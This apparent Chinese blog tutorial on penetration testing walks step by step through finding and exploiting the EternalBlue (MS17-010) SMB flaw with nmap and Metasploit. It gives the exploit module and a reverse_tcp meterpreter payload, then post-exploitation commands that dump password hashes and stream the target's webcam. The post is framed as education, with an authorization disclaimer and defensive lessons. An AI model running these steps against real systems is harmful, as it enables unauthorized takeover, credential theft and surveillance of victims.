#  渗透测试实战：永恒之蓝漏洞识别、扫描与Metasploit利用全流程   
原创 VlangCN  HW安全之路   2025-05-05 03:02  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Bvow4Cv9oZ3eTrDwp7Jvu3HrLl577luB3N20eQv69BlgDY1wRI95fZaWicCXUSy9h0KWGPnkUgN7Jz0sGiaHOF2g/640?wx_fmt=gif&from=appmsg "")  
  
  
如果你近几年关注过网络安全新闻，你很可能听说过永恒之蓝（EternalBlue）。  
  
这个Windows系统的严重漏洞在全球范围内肆虐的WannaCry勒索软件攻击中扮演了关键角色，影响了超过150个国家的系统。  
  
在本文中，我们将深入了解永恒之蓝的工作原理，如何扫描检测它，以及如何使用Metasploit框架进行漏洞利用。  
  
**特别提醒**  
：本文内容严格限于道德黑客行为和渗透测试目的，且只能用于你拥有或已获得明确许可测试的系统上。切勿在未经授权的机器上使用这些工具。  
## 永恒之蓝是什么？  
  
永恒之蓝（漏洞编号MS17-010）是微软服务器消息块（SMB）协议中的一个漏洞，特别是在445端口上。SMB协议帮助网络上的设备（如打印机和文件服务器）相互通信。  
  
这个漏洞最初由美国国家安全局（NSA）发现并开发了相应的攻击工具。后来，这些工具被泄露并被黑客改造成WannaCry勒索软件，造成了全球范围的混乱。  
## 准备工作  
- 一个易受永恒之蓝攻击的Windows系统（例如，未打补丁的Windows 7系统）  
  
- 一个安装了Metasploit的攻击系统（通常是Kali Linux）  
  
- 熟悉基本的渗透测试命令（Nmap、Metasploit等）  
  
## 识别目标并检查开放端口  
  
首先，获取目标机器的IP地址。在我们的示例中，IP为10.10.232.162。你需要确认SMB服务（445端口）是否开放，因为永恒之蓝正是攻击SMB服务的。  
```
nmap -p 445 10.10.232.162

```  
  
如果该端口开放，Nmap将报告445端口处于开放状态。这是你的第一个绿灯信号。  
## 启动Metasploit  
  
打开终端并启动Metasploit框架：  
```
msfconsole

```  
  
Metasploit将加载并显示可用的漏洞利用模块、辅助模块和载荷的数量。  
## 扫描永恒之蓝（MS17-010）漏洞  
  
接下来，使用Metasploit内置的永恒之蓝扫描器：  
```
search scanner eternalblue

```  
  
使用smb_ms17_010扫描器来检查永恒之蓝漏洞：  
```
use auxiliary/scanner/smb/smb_ms17_010
show options

```  
  
设置目标IP地址（RHOSTS）为你的Windows机器：  
```
set RHOSTS 10.10.217.189

```  
  
然后，运行扫描器：  
```
run

```  
  
如果扫描器报告主机"很可能易受攻击"并显示诸如"Windows 7 Professional"之类的详细信息，那么你已经确认了永恒之蓝漏洞的存在。  
## 利用漏洞  
  
一旦确认目标系统易受攻击，搜索实际的永恒之蓝漏洞利用模块：  
```
search exploit eternalblue

```  
  
你应该会看到一系列可能的漏洞利用模块。我们感兴趣的通常标记为：  
```
exploit/windows/smb/ms17_010_eternalblue

```  
  
使用该漏洞利用模块：  
```
use exploit/windows/smb/ms17_010_eternalblue
show options

```  
  
再次设置目标IP地址：  
```
set RHOSTS 10.10.217.189

```  
  
检查载荷设置：Metasploit通常默认为Meterpreter载荷（例如，windows/x64/meterpreter/reverse_tcp），这是理想的选择。确认你的本地IP（LHOST）是正确的，这样连接才能回到你的机器。  
  
最后，执行漏洞利用：  
```
run

```  
## Meterpreter Shell和后渗透阶段  
  
如果成功，你将获得一个Meterpreter shell。Meterpreter是一个功能强大的载荷，允许你：  
- 从安全账户管理器（SAM）中导出密码哈希值  
  
- 提升权限获取SYSTEM级别访问权限  
  
- 捕获摄像头流、录制麦克风等（在道德准则下用于演示和测试）  
  
以下是一些Meterpreter命令的快速浏览：  
```
sysinfo         # 显示目标系统信息
getuid          # 显示你当前运行的用户上下文
hashdump        # 导出SAM密码哈希（需要权限提升）
webcam_stream   # 如果可用，从目标的摄像头流式传输

```  
  
永恒之蓝漏洞是一个典型的例子，展示了单个未修补的漏洞如何使系统暴露于接管风险中。  
  
理解其机制有助于防御团队修补系统、监控网络流量中可疑的SMB通信，并创建强大的响应策略。  
## 结论  
  
永恒之蓝仍然是最著名的Windows漏洞之一，它生动地说明了补丁管理和网络安全卫生的重要性。从使用Nmap扫描到使用Metasploit进行漏洞利用，整个过程遵循了典型的渗透测试工作流：扫描漏洞、识别弱点、进行利用和权限提升。  
  
如果这篇文章帮助你理解了永恒之蓝的内部工作原理，欢迎分享并探索更多道德黑客资源。  
## 深度思考  
  
永恒之蓝漏洞的影响远超技术层面，它引发了关于网络武器开发、0day漏洞披露责任以及全球互联系统脆弱性的深刻讨论。作为技术人员，了解这些工具的强大威力，同时保持高度的道德意识，对构建更安全的数字世界至关重要。  
  
记住，真正的安全专家不是通过破坏系统，而是通过构建和加固系统来证明自己的价值。永恒之蓝提醒我们，即使是最小的安全漏洞也可能导致灾难性的后果，强调了及时更新和全面防御策略的重要性。  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Bvow4Cv9oZ0BfboLjHF8RcNM8wdoZl2hbZBZVwoRZaNYrgwKDmnUsdnHhEkK6c2iaxGpD0D7llpeM09WEQHyAqA/640?wx_fmt=gif&from=appmsg "")  
  
****  
**关注我们的公众号，并给本文点赞，点个推荐支持一下吧！您的每一个小红心，都是我坚持创作优质内容的最大动力**  
  
  
